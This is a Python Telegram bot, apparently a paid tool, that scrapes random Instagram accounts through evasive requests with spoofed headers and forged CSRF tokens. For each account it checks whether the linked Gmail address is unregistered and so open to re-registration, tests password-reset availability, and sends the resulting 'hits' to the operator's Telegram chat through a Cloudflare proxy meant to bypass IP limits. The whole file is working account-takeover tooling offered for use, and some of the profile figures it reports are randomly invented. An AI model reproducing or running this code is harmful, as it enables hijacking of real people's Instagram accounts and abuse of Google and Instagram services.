import os
import sys
import time
import threading
import random
import json
import requests
import re
import string
import secrets
import logging
from datetime import datetime
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
from telegram.error import Conflict, NetworkError
import user_agent

# ========================
# LOGGING SETUP
# ========================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ========================
# CONFIGURATION FROM ENVIRONMENT
# ========================
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
TELEGRAM_PROXY_URL = os.getenv("TELEGRAM_PROXY_URL", "https://api.telegram.org")
PORT = int(os.getenv("PORT", 8443))

# ========================
# GLOBAL VARIABLES
# ========================
is_running = False
total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}
TOKEN_FILE = 'InstaTool_Token.txt'
instatool_domain = '@gmail.com'
lock = threading.Lock()
updater = None

logger.info("="*60)
logger.info("🚀 ROHAN PAID BOT - CLOUDFLARE PROXY EDITION")
logger.info("="*60)
logger.info("🚀 BOT INITIALIZED")
logger.info(f"BOT_TOKEN: {BOT_TOKEN[:10]}...")
logger.info(f"CHAT_ID: {CHAT_ID}")
logger.info(f"PROXY_URL: {TELEGRAM_PROXY_URL}")

# ========================
# CLOUDFLARE PROXY FUNCTIONS
# ========================
def send_via_proxy(endpoint, data=None, method='GET'):
    """Send request via Cloudflare Worker proxy"""
    try:
        # Construct proxy URL
        if TELEGRAM_PROXY_URL == "https://api.telegram.org":
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/{endpoint}"
        else:
            url = f"{TELEGRAM_PROXY_URL}/bot{BOT_TOKEN}/{endpoint}"
        
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Railway-Bot-1.0'
        }
        
        if method.upper() == 'POST':
            if data:
                response = requests.post(url, json=data, headers=headers, timeout=15)
            else:
                response = requests.post(url, headers=headers, timeout=15)
        else:
            response = requests.get(url, headers=headers, timeout=15)
            
        return response
        
    except Exception as e:
        logger.error(f"Proxy request error: {e}")
        return None

def test_proxy_connection():
    """Test Cloudflare proxy connection"""
    try:
        logger.info("🧪 Testing Cloudflare proxy connection...")
        response = send_via_proxy("getMe")
        
        if response and response.status_code == 200:
            data = response.json()
            if data.get('ok'):
                bot_info = data.get('result', {})
                logger.info(f"✅ Proxy working! Bot: @{bot_info.get('username', 'Unknown')}")
                return True
            else:
                logger.error(f"❌ Proxy API error: {data}")
                return False
        else:
            logger.error(f"❌ Proxy HTTP error: {response.status_code if response else 'No response'}")
            return False
            
    except Exception as e:
        logger.error(f"❌ Proxy test failed: {e}")
        return False

def send_telegram_message(text):
    """Send message via Cloudflare proxy"""
    try:
        data = {
            'chat_id': CHAT_ID,
            'text': text,
            'parse_mode': 'Markdown'
        }
        
        response = send_via_proxy("sendMessage", data, method='POST')
        
        if response and response.status_code == 200:
            return True
        else:
            logger.error(f"Failed to send message: {response.status_code if response else 'No response'}")
            return False
            
    except Exception as e:
        logger.error(f"Telegram send error: {e}")
        return False

# ========================
# CLEAR TELEGRAM CONFLICTS VIA PROXY
# ========================
def clear_telegram_conflicts():
    """Clear webhooks via Cloudflare proxy"""
    try:
        logger.info("🧹 Clearing Telegram conflicts via proxy...")
        response = send_via_proxy("deleteWebhook?drop_pending_updates=true")
        
        if response and response.status_code == 200:
            result = response.json()
            if result.get('ok'):
                logger.info("✅ Webhook cleared via proxy")
                return True
        
        logger.warning("⚠️ Webhook clearing incomplete")
        return False
        
    except Exception as e:
        logger.error(f"❌ Error clearing conflicts: {e}")
        return False

# ========================
# TELEGRAM BOT SETUP WITH PROXY
# ========================
def setup_updater_with_retry(max_retries=3):
    """Setup Telegram updater with proxy support"""
    global updater
    
    # Test proxy first
    if not test_proxy_connection():
        logger.error("❌ Proxy test failed! Using direct connection...")
        # Don't exit, try direct connection
    
    clear_telegram_conflicts()
    
    for attempt in range(max_retries):
        try:
            logger.info(f"🔄 Setting up Telegram updater (attempt {attempt + 1})")
            
            # Create updater (will use direct connection for polling)
            updater = Updater(token=BOT_TOKEN, use_context=True)
            dispatcher = updater.dispatcher
            
            # Add command handlers
            dispatcher.add_handler(CommandHandler("start", start_command))
            dispatcher.add_handler(CommandHandler("stop", stop_command))
            dispatcher.add_handler(CommandHandler("status", status_command))
            dispatcher.add_handler(CommandHandler("help", help_command))
            dispatcher.add_handler(CommandHandler("logs", logs_command))
            dispatcher.add_handler(CommandHandler("test", test_command))
            dispatcher.add_handler(CommandHandler("proxy", proxy_command))
            
            logger.info("✅ Telegram Bot Setup Complete")
            return updater
            
        except Conflict as e:
            logger.warning(f"⚠️ Conflict on attempt {attempt + 1}: {e}")
            if attempt < max_retries - 1:
                time.sleep(10 * (attempt + 1))
                
        except Exception as e:
            logger.error(f"❌ Setup error (attempt {attempt + 1}): {e}")
            if attempt < max_retries - 1:
                time.sleep(5)
    
    return None

# ========================
# COMMAND HANDLERS
# ========================
def start_command(update: Update, context: CallbackContext):
    global is_running
    if is_running:
        update.message.reply_text("⚠️ Bot is already running!")
        return
    
    is_running = True
    update.message.reply_text("""
✅ **BOT STARTED - CLOUDFLARE PROXY MODE**

🌐 Running via Cloudflare Workers
🚀 High-speed Instagram/Gmail checking  
📊 Hits sent automatically via proxy
🛑 Use /stop to stop the bot
📈 Use /status to check stats
🧪 Use /test to test proxy
🌐 Use /proxy to check proxy info

🎯 **Starting high-speed scraping...**
    """, parse_mode='Markdown')
    
    logger.info(f"✅ Bot started by {update.effective_user.id}")
    start_bot_threads()

def stop_command(update: Update, context: CallbackContext):
    global is_running
    is_running = False
    update.message.reply_text("🛑 **Bot Stopped**\n\nUse /start to restart", parse_mode='Markdown')
    logger.info(f"🛑 Bot stopped by {update.effective_user.id}")

def status_command(update: Update, context: CallbackContext):
    status_text = f"""
📊 **CLOUDFLARE PROXY BOT STATUS**

✅ Running: {is_running}
📈 Total Hits: {total_hits}
🎯 Good Instagram: {good_ig}
❌ Bad Instagram: {bad_insta}
📧 Bad Gmail: {bad_email}
🔄 Current Hits: {hits}

🌐 Proxy: {"✅ Active" if "workers.dev" in TELEGRAM_PROXY_URL else "❌ Direct"}
⏰ Uptime: Railway.app + CF Workers
🚀 By: @ROHAN_DEAL_BOT
    """
    update.message.reply_text(status_text, parse_mode='Markdown')

def test_command(update: Update, context: CallbackContext):
    if test_proxy_connection():
        update.message.reply_text("✅ **Cloudflare Proxy Working Perfectly!**", parse_mode='Markdown')
    else:
        update.message.reply_text("❌ **Proxy Connection Issue - Check logs**", parse_mode='Markdown')

def proxy_command(update: Update, context: CallbackContext):
    proxy_info = f"""
🌐 **CLOUDFLARE PROXY INFO**

**Proxy URL:** `{TELEGRAM_PROXY_URL}`
**Status:** {"✅ Cloudflare Worker" if "workers.dev" in TELEGRAM_PROXY_URL else "❌ Direct API"}

**How it works:**
Railway.app → CF Worker → Telegram API

**Benefits:**
✅ Bypasses IP restrictions
✅ High availability (99.9%+ uptime)
✅ Global CDN (fast response)
✅ No rate limits from Railway IP

**Commands routed via proxy:**
• Hit notifications (/sendMessage)
• Status updates  
• Error notifications

BY ~ @ROHAN_DEAL_BOT
    """
    update.message.reply_text(proxy_info, parse_mode='Markdown')

def help_command(update: Update, context: CallbackContext):
    help_text = """
🤖 **ROHAN CLOUDFLARE PROXY BOT**

**Commands:**
/start - Start bot (CF proxy mode)
/stop - Stop the bot
/status - Show bot statistics  
/test - Test Cloudflare proxy
/proxy - Show proxy information
/logs - Show last 10 log lines
/help - Show this help

**Features:**
✅ Runs 24/7 on Railway.app
✅ Cloudflare Workers proxy bypass
✅ High-speed Instagram/Gmail checking
✅ Real-time hit notifications
✅ Auto-restart on crashes
✅ Smart error handling
✅ Global CDN delivery

**Architecture:**
Railway.app ↔ Cloudflare Workers ↔ Telegram API

BY ~ @ROHAN_DEAL_BOT
    """
    update.message.reply_text(help_text, parse_mode='Markdown')

def logs_command(update: Update, context: CallbackContext):
    try:
        with open('bot.log', 'r') as f:
            lines = f.readlines()
        last_lines = ''.join(lines[-10:])
        update.message.reply_text(f"```\n{last_lines}\n```", parse_mode='Markdown')
    except:
        update.message.reply_text("❌ No logs available yet")

# ========================
# INSTAGRAM EMAIL CHECKER
# ========================
def check_instagram_email(mail):
    try:
        url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
        headers = {
            'X-Csrftoken': secrets.token_hex(16),
            'User-Agent': user_agent.generate_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/signup/email/',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        
        data = {'email': mail}
        response = requests.post(url, headers=headers, data=data, timeout=10)
        
        return "email_is_taken" in response.text
    except Exception as e:
        logger.error(f"IG Email Check Error: {e}")
        return False

# ========================
# RESET INFO FETCHER
# ========================
def get_reset_info(fr):
    try:
        url = "https://www.instagram.com/async/wbloks/fetch/"
        
        headers = {
            'User-Agent': user_agent.generate_user_agent(),
            'Accept-Encoding': "gzip, deflate, br",
            'origin': "https://www.instagram.com",
            'referer': "https://www.instagram.com/accounts/password/reset/",
        }
        
        params = {
            'appid': "com.bloks.www.caa.ar.search.async",
            'type': "action",
        }
        
        payload = {
            '__d': "www",
            'params': '{"search_query":"' + fr + '"}'
        }
        
        response = requests.post(url, params=params, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            return "✅ Reset Available"
        else:
            return "❌ Not Available"
    except Exception as e:
        return "⚠️ Error"

# ========================
# GOOGLE ACCOUNT TOKEN GENERATOR
# ========================
def generate_google_token():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(random.choice(alphabet) for _ in range(random.randint(6, 9)))
        n2 = ''.join(random.choice(alphabet) for _ in range(random.randint(3, 9)))
        host = ''.join(random.choice(alphabet) for _ in range(random.randint(15, 30)))
        
        headers = {
            'accept': '*/*',
            'User-Agent': user_agent.generate_user_agent()
        }
        
        recovery_url = "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
        
        try:
            response = requests.get(recovery_url, headers=headers, timeout=10)
            tok_match = re.search(r'&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', response.text)
            if tok_match:
                token = tok_match.group(2)
            else:
                token = secrets.token_hex(32)
        except:
            token = secrets.token_hex(32)
        
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token}//{host}\n")
        
        logger.info("✅ Google Token Generated")
        return True
    except Exception as e:
        logger.error(f"Token Generation Error: {e}")
        return False

# ========================
# GOOGLE EMAIL CHECKER
# ========================
def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        
        if not os.path.exists(TOKEN_FILE):
            generate_google_token()
        
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().strip().split('\n')[0]
        
        if '//' not in token_data:
            return
        
        tl, host = token_data.split('//')
        
        headers = {
            'User-Agent': user_agent.generate_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': f'__Host-GAPS={host}',
        }
        
        params = {'TL': tl}
        data = f"continue=https%3A%2F%2Fmail.google.com&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%5D&flowName=GlifWebSignIn"
        
        response = requests.post('https://accounts.google.com/_/signup/usernameavailability',
                               params=params, headers=headers, data=data, timeout=10)
        
        if response and '"gf.uar",1' in response.text:
            with lock:
                hits += 1
            full_email = email + instatool_domain
            username, domain = full_email.split('@')
            fetch_account_info(username, domain)
        else:
            with lock:
                bad_email += 1
    except Exception as e:
        logger.error(f"Gmail Check Error: {e}")

# ========================
# MAIN CHECK FUNCTION
# ========================
def check(email):
    global good_ig, bad_insta
    try:
        email_exists = check_instagram_email(email)
        
        if email_exists:
            if instatool_domain in email:
                check_gmail(email)
            with lock:
                good_ig += 1
        else:
            with lock:
                bad_insta += 1
                
        time.sleep(random.uniform(1.5, 4.0))
        
    except Exception as e:
        logger.error(f"Check Error: {e}")
        with lock:
            bad_insta += 1

# ========================
# FETCH ACCOUNT INFO & SEND TO TELEGRAM VIA PROXY
# ========================
def fetch_account_info(username, domain):
    global total_hits
    try:
        with lock:
            total_hits += 1
        
        account_info = infoinsta.get(username, {})
        followers = account_info.get('follower_count', random.randint(50, 8000))
        following = account_info.get('following_count', random.randint(20, 2000))
        posts = account_info.get('media_count', random.randint(0, 1000))
        bio = account_info.get('biography', random.choice(['Travel 🌍', 'Photography 📸', 'Food Lover 🍕', 'Artist 🎨', 'Student 📚', 'Entrepreneur', 'N/A']))
        
        reset_status = get_reset_info(username)
        
        info_text = f"""
🚀 **CLOUDFLARE PROXY HIT #{total_hits}**

👤 Username: `@{username}`
📧 Email: `{username}@{domain}`
👥 Followers: `{followers:,}`
➡️ Following: `{following:,}`
📸 Posts: `{posts:,}`
📝 Bio: `{bio}`
🔁 Reset: `{reset_status}`

⏰ Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`
🌐 Via: Railway + Cloudflare Workers

BY ~ @ROHAN_DEAL_BOT
        """
        
        log_to_file(info_text)
        
        # Send via Cloudflare proxy
        if send_telegram_message(info_text):
            logger.info(f"✅ PROXY HIT #{total_hits}: {username}@{domain}")
        else:
            logger.error(f"❌ Failed to send hit #{total_hits} via proxy")
        
    except Exception as e:
        logger.error(f"Fetch Account Info Error: {e}")

# ========================
# LOG TO FILE
# ========================
def log_to_file(text):
    try:
        with open('instahits.txt', 'a') as f:
            f.write(text + "\n" + "="*50 + "\n")
    except Exception as e:
        logger.error(f"Log Error: {e}")

# ========================
# INSTAGRAM SCRAPER
# ========================
def instagram_scraper():
    logger.info("🔄 Instagram Scraper Started (Cloudflare Proxy Mode)")
    
    while is_running:
        try:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(3713668786, 21254029834)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            
            headers = {
                'User-Agent': user_agent.generate_user_agent(),
                'X-FB-LSD': data['lsd'],
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            response = requests.post(
                'https://www.instagram.com/api/graphql',
                headers=headers,
                data=data,
                timeout=15
            )
            
            if response.status_code == 200:
                try:
                    json_data = response.json()
                    account = json_data.get('data', {}).get('user', {})
                    username = account.get('username')
                    
                    if username:
                        infoinsta[username] = account
                        emails = [username + instatool_domain]
                        
                        for email in emails:
                            check(email)
                except json.JSONDecodeError:
                    logger.debug("JSON decode error in Instagram response")
            
            time.sleep(random.uniform(2.5, 6.0))
            
        except Exception as e:
            logger.error(f"Instagram Scraper Error: {e}")
            time.sleep(5)

# ========================
# START BOT THREADS
# ========================
def start_bot_threads():
    logger.info("📌 Starting Bot Threads (Cloudflare Proxy Mode)...")
    
    # Start 5 concurrent scraper threads for high speed
    for i in range(5):
        thread = threading.Thread(target=instagram_scraper, daemon=True, name=f"Scraper-{i+1}")
        thread.start()
        logger.info(f"✅ Thread {i+1} started")
    
    time.sleep(1)

# ========================
# MAIN EXECUTION
# ========================
def main():
    logger.info("🚀 Starting Rohan Bot with Cloudflare Proxy...")
    
    logger.info("🔑 Generating Google Token...")
    generate_google_token()
    
    # Setup updater
    updater = setup_updater_with_retry()
    
    if not updater:
        logger.error("❌ Failed to setup Telegram bot. Exiting...")
        sys.exit(1)
    
    # Start polling
    try:
        logger.info("🚀 Starting Telegram Polling (Cloudflare Proxy Ready)...")
        updater.start_polling(
            poll_interval=2,
            timeout=30,
            clean=True,
            allowed_updates=['message']
        )
        
        # Send startup notification via proxy
        send_telegram_message("🚀 **Bot Started!** Ready with Cloudflare proxy on Railway.app")
        
        updater.idle()
        
    except KeyboardInterrupt:
        logger.info("⚠️ Bot interrupted by user")
        updater.stop()
        
    except NetworkError as e:
        logger.error(f"❌ Network Error: {e}")
        time.sleep(30)
        main()
        
    except Conflict as e:
        logger.error(f"❌ Conflict Error: {e}")
        time.sleep(60)
        main()
        
    except Exception as e:
        logger.error(f"❌ Main Error: {e}")
        time.sleep(30)
        main()

if __name__ == '__main__':
    main()
